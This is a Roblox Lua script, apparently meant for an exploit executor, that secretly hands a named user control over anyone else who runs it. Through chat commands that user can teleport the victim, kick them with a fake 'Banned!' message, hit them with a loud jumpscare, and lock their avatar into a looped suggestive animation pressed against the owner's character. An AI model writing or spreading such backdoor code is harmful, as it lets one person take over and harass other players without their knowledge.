getgenv().perm_user = "sp0zx" -- or "iiiiiii1iiiii1111iii"
getgenv().mod = "sp0zx"

repeat wait()
if game.Players:FindFirstChild(getgenv().mod) then
    game.Players[getgenv().mod].Character.Humanoid.DisplayName = ('[📜] ' .. game.Players[getgenv().mod].DisplayName)
    game.Players[getgenv().mod].Chatted:Connect(function(msg)
        if msg == "!fix emoji" then
    game.Players[getgenv().mod].Character.Humanoid.DisplayName = ('[📜] ' .. game.Players[getgenv().mod].DisplayName)
        end
    end)
end
until game.Players:FindFirstChild(getgenv().mod)

if game.Players.LocalPlayer.Name == getgenv().perm_user then
    print("no")
    else
repeat wait()
if game.Players:FindFirstChild(getgenv().perm_user) then
    print("loading prem")
function bring()
    local runService = game:GetService("RunService")
    local client = game:GetService("Players").LocalPlayer
    local connections = {}
    
    local function getRootPart()
       local character = client.Character or client.CharacterAdded:Wait()
       
       return character:WaitForChild("HumanoidRootPart")
    end
    
    local function teleport()
       connections["Heartbeat"] = runService.Heartbeat:Connect(function()
           local rootPart = getRootPart()
           local oldVelocity = rootPart.Velocity
           
           rootPart.Velocity = Vector3.new(0, -550, 0)
           runService.RenderStepped:Wait()
           rootPart.Velocity = oldVelocity
    
           task.wait(.4)
           connections["Heartbeat"]:Disconnect()
       end)
       
       task.wait(.2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[getgenv().perm_user].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
    end
            teleport()
            end

game.Players[getgenv().perm_user].Chatted:Connect(function(msg)
    if msg == ":bring ." then
bring()
game.Players[getgenv().perm_user].Character.Humanoid.DisplayName = ('[📜] ' .. game.Players[getgenv().perm_user].DisplayName)
    end
end) -- rbxassetid://12837655677
game.Players[getgenv().perm_user].Chatted:Connect(function(msg)
    if msg == ":benx ." then
    Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://14776100893" -- 7591841541
Crouch = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
   
bring()
game.Players[getgenv().perm_user].Character.Humanoid.DisplayName = ('[📜] ' .. game.Players[getgenv().perm_user].DisplayName)

wait(0.5)
local away = .5
local reversing = false
local Loop
local loopFunction = function()
Crouch:Play()
	local targetchar = game.Players[getgenv().perm_user]
	local character = game.Players.LocalPlayer.Character
	if targetchar then
		if reversing == true then
			away = away - 0.1
		else
			away = away + 0.1
		end
		if away >= 2 then
			reversing = true
		elseif away < 0.5 then
			reversing = false
		end
		character.HumanoidRootPart.CFrame = game.Players[getgenv().perm_user].Character.HumanoidRootPart.CFrame + game.Players[getgenv().perm_user].Character.HumanoidRootPart.CFrame.lookVector * away
	end
end
	getgenv().Underground = true 
game:GetService("RunService").heartbeat:Connect(function()
    if getgenv().Underground ~= false then 
    game:GetService("RunService").RenderStepped:Wait()
loopFunction()
    end
end)
getgenv().Underground = true
Start()
    end
end)
game.Players[getgenv().perm_user].Chatted:Connect(function(msg)
    if msg == ":unbenx ." then
	getgenv().Underground = false
	Crouch:Stop()
	Crouch:Stop()
		Crouch:Stop()
	Crouch:Stop()
		Crouch:Stop()
	Crouch:Stop()
    character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.new(0,0,3)
    end
end)
game.Players[getgenv().perm_user].Chatted:Connect(function(msg)
    if msg == ":stop ." then
	getgenv().Underground = false
	Crouch:Stop()
	Crouch:Stop()
		Crouch:Stop()
	Crouch:Stop()
		Crouch:Stop()
	Crouch:Stop()
    character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.new(0,0,3)
    end
end)
game.Players[getgenv().perm_user].Chatted:Connect(function(msg)
if msg == ":ban ." then
game.Players.LocalPlayer:Kick("Banned!")
end
end)
game.Players[getgenv().perm_user].Chatted:Connect(function(msg)
if msg == ":jumpscare ." then
local jumpscare = Instance.new("ScreenGui")
local image = Instance.new("ImageLabel")
local JumpScareSound = Instance.new("Sound")

JumpScareSound.Parent = game:GetService("SoundService")
JumpScareSound.SoundId = "rbxassetid://3537873683"
JumpScareSound.Looped = false
JumpScareSound.Volume = 10
JumpScareSound.Name = "JumpScareSound"

jumpscare.Name = "jumpscare"
jumpscare.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
jumpscare.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

JumpScareSound:Play()
image.Name = "image"
image.Parent = jumpscare
image.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
image.BorderColor3 = Color3.fromRGB(0, 0, 0)
image.BorderSizePixel = 0
image.Position = UDim2.new(0, 0, -0.00617283955, 0)
image.Size = UDim2.new(1, 0, 1, 5)
image.Image = "http://www.roblox.com/asset/?id=1951484061"

wait(2)
game:GetService("Players").LocalPlayer.PlayerGui.jumpscare:Destroy()
wait(1.5)
game:GetService("SoundService").JumpScareSound:Destroy()

end
end)
end -- dont delete dingus
until game.Players:FindFirstChild(getgenv().perm_user).Character:FindFirstChild("Humanoid")
print("found owner")
end
